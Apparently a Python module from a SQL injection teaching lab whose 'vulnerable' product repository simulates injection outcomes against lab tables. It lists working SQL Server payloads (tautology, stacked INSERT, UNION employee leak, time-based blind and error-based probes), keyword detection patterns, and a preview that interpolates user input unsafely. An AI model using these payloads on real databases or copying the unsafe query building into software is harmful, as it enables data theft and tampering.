import re
from time import perf_counter
from typing import Any

from sqlalchemy import create_engine, text
from sqlalchemy.engine import Engine

from ..config import DATABASE_CONFIG
from .labs_support import LABS_CLEAR_ATTACK_LOG_QUERY, LabsBootstrapper

VULNERABLE_LIST_PRODUCTS_QUERY = text(
    """
    SELECT
        CAST(s.product_id AS INT) AS product_id,
        s.name AS name,
        CAST(s.list_price AS DECIMAL(18,2)) AS list_price,
        CAST(s.standard_cost AS DECIMAL(18,2)) AS standard_cost,
        CAST(s.sell_start_date AS DATE) AS sell_start_date,
        s.product_status AS product_status,
        CAST(s.created_at AS DATETIME2) AS created_at,
        s.description AS description
    FROM Labs.ProductSearchSnapshot AS s
    WHERE (:include_unavailable = 1 OR s.product_status = N'Available')
      AND (:search_text IS NULL OR s.name LIKE :search_pattern)
    ORDER BY s.name ASC;
    """
)

LAB_NEXT_PRODUCT_SNAPSHOT_ID_QUERY = text(
    """
    SELECT
        CASE
            WHEN MAX(CASE WHEN product_id >= 900000 THEN product_id END) IS NULL THEN 900001
            ELSE MAX(CASE WHEN product_id >= 900000 THEN product_id END) + 1
        END AS next_product_id
    FROM Labs.ProductSearchSnapshot;
    """
)

LAB_INSERT_PRODUCT_SNAPSHOT_ROW_QUERY = text(
    """
    INSERT INTO Labs.ProductSearchSnapshot (
        product_id,
        name,
        list_price,
        standard_cost,
        sell_start_date,
        product_status,
        description,
        created_at
    )
    VALUES (
        :product_id,
        :name,
        :list_price,
        :standard_cost,
        :sell_start_date,
        :product_status,
        :description,
        CAST(GETDATE() AS DATETIME2)
    );
    """
)

LAB_SELECT_PRODUCT_SNAPSHOT_ROW_QUERY = text(
    """
    SELECT
        CAST(s.product_id AS INT) AS product_id,
        s.name AS name,
        CAST(s.list_price AS DECIMAL(18,2)) AS list_price,
        CAST(s.standard_cost AS DECIMAL(18,2)) AS standard_cost,
        CAST(s.sell_start_date AS DATE) AS sell_start_date,
        CAST(NULL AS DATE) AS sell_end_date,
        s.product_status AS product_status,
        CAST(s.created_at AS DATETIME2) AS created_at,
        s.description AS description
    FROM Labs.ProductSearchSnapshot AS s
    WHERE s.product_id = :product_id;
    """
)

LAB_SEARCH_SNAPSHOT_ONLY_PRODUCTS_QUERY = text(
    """
    SELECT TOP 200
        CAST(s.product_id AS INT) AS product_id,
        s.name AS name,
        CAST(s.list_price AS DECIMAL(18,2)) AS list_price,
        CAST(s.standard_cost AS DECIMAL(18,2)) AS standard_cost,
        CAST(s.sell_start_date AS DATE) AS sell_start_date,
        CAST(NULL AS DATE) AS sell_end_date,
        s.product_status AS product_status,
        CAST(s.created_at AS DATETIME2) AS created_at,
        s.description AS description
    FROM Labs.ProductSearchSnapshot AS s
    WHERE (s.product_id >= 900000 OR s.description = N'Controlled INSERT payload added this row.')
      AND (:search_text IS NULL OR s.name LIKE :search_pattern)
    ORDER BY s.created_at DESC, s.product_id DESC;
    """
)

LAB_EMPLOYEE_UNION_LEAK_QUERY = text(
    """
    SELECT TOP 200
        CAST(e.BusinessEntityID AS INT) AS product_id,
        e.LoginID AS name,
        CAST(e.SickLeaveHours AS DECIMAL(18,2)) AS list_price,
        CAST(e.VacationHours AS DECIMAL(18,2)) AS standard_cost,
        CAST(e.BirthDate AS DATE) AS sell_start_date,
        CAST(N'Unavailable' AS NVARCHAR(32)) AS product_status,
        e.JobTitle AS description
    FROM Labs.EmployeeSnapshot AS e
    ORDER BY e.BusinessEntityID ASC;
    """
)

LAB_INSERT_LOG_QUERY = text(
    """
    INSERT INTO Labs.AttackLog (action_name, injected_text, note)
    VALUES (:action_name, :injected_text, :note);
    """
)

GET_PRODUCT_SNAPSHOT_QUERY = text(
    """
    SELECT
        CAST(s.product_id AS INT) AS product_id,
        s.name AS name,
        CAST(s.list_price AS DECIMAL(18,2)) AS list_price,
        CAST(s.standard_cost AS DECIMAL(18,2)) AS standard_cost,
        CAST(s.sell_start_date AS DATE) AS sell_start_date,
        CAST(NULL AS DATE) AS sell_end_date,
        s.product_status AS product_status,
        CAST(s.created_at AS DATETIME2) AS created_at,
        s.description AS description
    FROM Labs.ProductSearchSnapshot AS s
    WHERE s.product_id = :product_id;
    """
)

LAB_TIME_BASED_CHAR_PROBE_QUERY = text(
    """
    IF SUBSTRING(CAST(DB_NAME() AS NVARCHAR(128)), :position, 1) = :candidate
        WAITFOR DELAY '00:00:01.000';

    SELECT 1 AS probe_executed;
    """
)

LAB_FORCE_DB_ERROR_QUERY = text(
    """
    SELECT CAST(N'SQLI_DEMO_ERROR' AS INT) AS forced_db_error;
    """
)

TIME_BASED_DELAY_MILLISECONDS = 1000
TIME_BASED_MATCH_THRESHOLD_MILLISECONDS = 700

TIME_BASED_SUBSTRING_PATTERN = re.compile(
    r"substring\s*\(\s*(?:database\(\)|db_name\(\)|\(\s*select\s+db_name\(\)\s*\))\s*,\s*(\d+)\s*,\s*1\s*\)\s*=\s*N?['\"]([^'\"]{1})['\"]",
    re.IGNORECASE,
)


class ProductRepositoryVulnerable:
    def __init__(self, engine: Engine | None = None):
        self.engine = engine or create_engine(
            DATABASE_CONFIG.to_sqlalchemy_url(),
            future=True,
            pool_pre_ping=True,
            echo=True,
        )
        self._bootstrapper = LabsBootstrapper(self.engine)
        self._lab_ready = False

    @staticmethod
    def detect_lab_actions(search_text: str) -> dict[str, bool]:
        lowered = search_text.strip().lower()
        normalized = " ".join(lowered.split())
        compact = "".join(lowered.split())
        time_based_probe = ProductRepositoryVulnerable.extract_time_based_probe(search_text)
        insert_product_snapshot_pattern = (
            "into[labs].[productsearchsnapshot]" in compact
            or "intolabs.productsearchsnapshot" in compact
            or "into[lab].[productsearchsnapshot]" in compact
            or "intolab.productsearchsnapshot" in compact
        )
        union_employee_snapshot_pattern = (
            "from[labs].[employeesnapshot]" in compact
            or "fromlabs.employeesnapshot" in compact
        )
        insert_attack_log_pattern = (
            "into[labs].[attacklog]" in compact
            or "intolabs.attacklog" in compact
            or "into[lab].[attacklog]" in compact
            or "intolab.attacklog" in compact
        )
        force_db_error_pattern = (
            "cast(" in lowered
            and "asint" in compact
            and "sqli_demo_error" in compact
        )
        time_based_delay_pattern = time_based_probe is not None and (
            "sleep(" in compact or ("waitfor" in lowered and "delay" in lowered)
        )

        return {
            "bypass_filter": "or 1=1" in normalized,
            "insert_product_snapshot": ("insert" in lowered and insert_product_snapshot_pattern),
            "union_employee_snapshot": ("union" in lowered and union_employee_snapshot_pattern),
            "insert_log": ("insert" in lowered and insert_attack_log_pattern),
            "force_db_error": force_db_error_pattern,
            "time_based_delay": time_based_delay_pattern,
            "suspicious": any(
                marker in lowered
                for marker in [
                    "'",
                    "--",
                    "/*",
                    "*/",
                    ";",
                    "union",
                    "select",
                    "insert",
                    " or ",
                    " and ",
                    "waitfor",
                    "sleep(",
                ]
            ),
        }

    @staticmethod
    def extract_time_based_probe(search_text: str) -> dict[str, Any] | None:
        match = TIME_BASED_SUBSTRING_PATTERN.search(search_text.strip())
        if not match:
            return None
        return {"position": int(match.group(1)), "character": match.group(2)}

    @staticmethod
    def lab_payload_examples() -> list[dict[str, str]]:
        return [
            {
                "title": "Tautology SQL Injection: filter bypass (OR 1=1)",
                "payload": "' OR 1=1 --",
            },
            {
                "title": "Stacked-query SQL Injection: controlled INSERT into Labs.ProductSearchSnapshot",
                "payload": (
                    "'; INSERT INTO [Labs].[ProductSearchSnapshot] "
                    "(product_id,name,list_price,standard_cost,sell_start_date,product_status,description,created_at) "
                    "VALUES (900001,'Injected Product',1,1,'2026-01-01','Pending release','Injected via SQLi',GETDATE()) --"
                ),
            },
            {
                "title": "UNION-based SQL Injection: controlled data leak from Labs.EmployeeSnapshot",
                "payload": (
                    "' UNION ALL SELECT [BusinessEntityID],[LoginID],[SickLeaveHours],"
                    "[VacationHours],[BirthDate],[JobTitle] FROM [Labs].[EmployeeSnapshot] --"
                ),
            },
            {
                "title": "Time-based blind SQL Injection: infer DB_NAME() one character by response delay",
                "payload": "'; IF(SUBSTRING((SELECT DB_NAME()),1,1)='A') WAITFOR DELAY '00:00:01.000' --",
            },
            {
                "title": "Time-based blind SQL Injection: probe DB_NAME()[1] = 'B'",
                "payload": "'; IF(SUBSTRING((SELECT DB_NAME()),1,1)='B') WAITFOR DELAY '00:00:01.000' --",
            },
            {
                "title": "Time-based blind SQL Injection: probe DB_NAME()[2] = 'd'",
                "payload": "'; IF(SUBSTRING((SELECT DB_NAME()),2,1)='d') WAITFOR DELAY '00:00:01.000' --",
            },
            {
                "title": "Error-based SQL Injection: force DB exception and leak details",
                "payload": "'; SELECT CAST(N'SQLI_DEMO_ERROR' AS INT) --",
            },
        ]

    def ensure_lab_assets(self) -> None:
        if self._lab_ready:
            return

        self._bootstrapper.ensure_assets()
        self._lab_ready = True

    def reset_lab_data(self) -> None:
        self._bootstrapper.refresh_snapshots()
        with self.engine.begin() as connection:
            connection.execute(LABS_CLEAR_ATTACK_LOG_QUERY)
        self._lab_ready = True

    def preview_search_products_unsafe(
        self, search_text: str = "", culture_id: str = "en"
    ) -> tuple[str, dict[str, Any]]:
        _ = culture_id
        search_text = search_text.strip()

        if search_text:
            filter_clause = f"AND s.name LIKE '%{search_text}%'"
        else:
            filter_clause = ""

        query_lines = [
            "SELECT",
            "        CAST(s.product_id AS INT) AS product_id,",
            "        s.name AS name,",
            "        CAST(s.list_price AS DECIMAL(18,2)) AS list_price,",
            "        CAST(s.standard_cost AS DECIMAL(18,2)) AS standard_cost,",
            "        CAST(s.sell_start_date AS DATE) AS sell_start_date,",
            "        CAST(NULL AS DATE) AS sell_end_date,",
            "        s.product_status AS product_status,",
            "        CAST(s.created_at AS DATETIME2) AS created_at,",
            "        s.description AS description",
            "    FROM Labs.ProductSearchSnapshot AS s",
            "    WHERE s.product_status = N'Available'",
        ]
        if filter_clause:
            query_lines.append(f"      {filter_clause}")
        query_lines.append("    ORDER BY s.name ASC;")

        return "\n".join(query_lines), {"table": "Labs.ProductSearchSnapshot"}

    def run_single_time_based_probe(self, injected_text: str) -> dict[str, Any]:
        probe = self.extract_time_based_probe(injected_text)
        if not probe:
            raise ValueError("Time-based probe payload pattern was not recognized.")

        self.ensure_lab_assets()
        position = int(probe["position"])
        candidate = str(probe["character"])
        probe_payload = (
            f"'; IF(SUBSTRING((SELECT DB_NAME()),{position},1)='{candidate}') "
            "WAITFOR DELAY '00:00:01.000' --"
        )
        started_at = perf_counter()

        with self.engine.begin() as connection:
            connection.execute(
                LAB_TIME_BASED_CHAR_PROBE_QUERY,
                {"position": position, "candidate": candidate},
            )
            elapsed_ms = round((perf_counter() - started_at) * 1000, 2)
            is_delayed = elapsed_ms >= TIME_BASED_MATCH_THRESHOLD_MILLISECONDS
            connection.execute(
                LAB_INSERT_LOG_QUERY,
                {
                    "action_name": "Time-based single probe",
                    "injected_text": injected_text[:4000],
                    "note": (
                        f"Position {position}, candidate '{candidate}', elapsed {elapsed_ms} ms. "
                        "Delay observed (condition likely TRUE)."
                        if is_delayed
                        else (
                            f"Position {position}, candidate '{candidate}', elapsed {elapsed_ms} ms. "
                            "No delay observed (condition likely FALSE)."
                        )
                    ),
                },
            )

        return {
            "position": position,
            "candidate": candidate,
            "probe_payload": probe_payload,
            "elapsed_ms": elapsed_ms,
            "is_delayed": is_delayed,
            "delay_ms": TIME_BASED_DELAY_MILLISECONDS,
            "threshold_ms": TIME_BASED_MATCH_THRESHOLD_MILLISECONDS,
        }

    def search_products(self, search_text: str = "", culture_id: str = "en") -> list[dict[str, Any]]:
        _ = culture_id
        query_text = search_text.strip()
        actions = self.detect_lab_actions(query_text)
        self.ensure_lab_assets()

        params = {
            "include_unavailable": 1 if actions["bypass_filter"] else 0,
            "search_text": None if (not query_text or actions["bypass_filter"]) else query_text,
            "search_pattern": None if (not query_text or actions["bypass_filter"]) else f"%{query_text}%",
        }

        with self.engine.begin() as connection:
            if actions["force_db_error"]:
                connection.execute(LAB_FORCE_DB_ERROR_QUERY)

            base_rows = connection.execute(VULNERABLE_LIST_PRODUCTS_QUERY, params).fetchall()
            products = [dict(row._mapping) for row in base_rows]

            extra_rows = connection.execute(
                LAB_SEARCH_SNAPSHOT_ONLY_PRODUCTS_QUERY,
                params,
            ).fetchall()
            known_product_ids = {
                int(product["product_id"])
                for product in products
                if product.get("product_id") is not None
            }
            for row in extra_rows:
                mapped_row = dict(row._mapping)
                mapped_product_id = mapped_row.get("product_id")
                if mapped_product_id is None:
                    continue
                mapped_product_id = int(mapped_product_id)
                if mapped_product_id in known_product_ids:
                    continue
                products.append(mapped_row)
                known_product_ids.add(mapped_product_id)

            if actions["insert_product_snapshot"]:
                next_product_id = connection.execute(LAB_NEXT_PRODUCT_SNAPSHOT_ID_QUERY).scalar_one()
                inserted_row_params = {
                    "product_id": int(next_product_id),
                    "name": "Injected Product",
                    "list_price": 1.00,
                    "standard_cost": 1.00,
                    "sell_start_date": "2026-01-01",
                    "product_status": "Pending release",
                    "description": "Controlled INSERT payload added this row.",
                }
                connection.execute(LAB_INSERT_PRODUCT_SNAPSHOT_ROW_QUERY, inserted_row_params)
                inserted_row = connection.execute(
                    LAB_SELECT_PRODUCT_SNAPSHOT_ROW_QUERY,
                    {"product_id": int(next_product_id)},
                ).fetchone()
                if inserted_row:
                    products.append(dict(inserted_row._mapping))
                connection.execute(
                    LAB_INSERT_LOG_QUERY,
                    {
                        "action_name": "INSERT product snapshot",
                        "injected_text": query_text[:4000],
                        "note": "Injected INSERT payload wrote a row to Labs.ProductSearchSnapshot.",
                    },
                )

            if actions["union_employee_snapshot"]:
                leak_rows = connection.execute(LAB_EMPLOYEE_UNION_LEAK_QUERY).fetchall()
                products.extend(dict(row._mapping) for row in leak_rows)
                connection.execute(
                    LAB_INSERT_LOG_QUERY,
                    {
                        "action_name": "UNION employee payload",
                        "injected_text": query_text[:4000],
                        "note": "Labs.EmployeeSnapshot payload pattern mapped to Labs.EmployeeSnapshot rows.",
                    },
                )

            if actions["insert_log"]:
                connection.execute(
                    LAB_INSERT_LOG_QUERY,
                    {
                        "action_name": "Injected write",
                        "injected_text": query_text[:4000],
                        "note": "Injected INSERT payload wrote to Labs.AttackLog.",
                    },
                )

            if actions["bypass_filter"]:
                connection.execute(
                    LAB_INSERT_LOG_QUERY,
                    {
                        "action_name": "Filter bypass",
                        "injected_text": query_text[:4000],
                        "note": "OR 1=1 pattern bypassed intended product-name filtering.",
                    },
                )

        return products

    def get_product(self, product_id: int, culture_id: str = "en") -> dict[str, Any] | None:
        _ = culture_id
        self.ensure_lab_assets()

        with self.engine.connect() as connection:
            row = connection.execute(
                GET_PRODUCT_SNAPSHOT_QUERY,
                {"product_id": product_id},
            ).fetchone()

        if row is None:
            return None

        return dict(row._mapping)
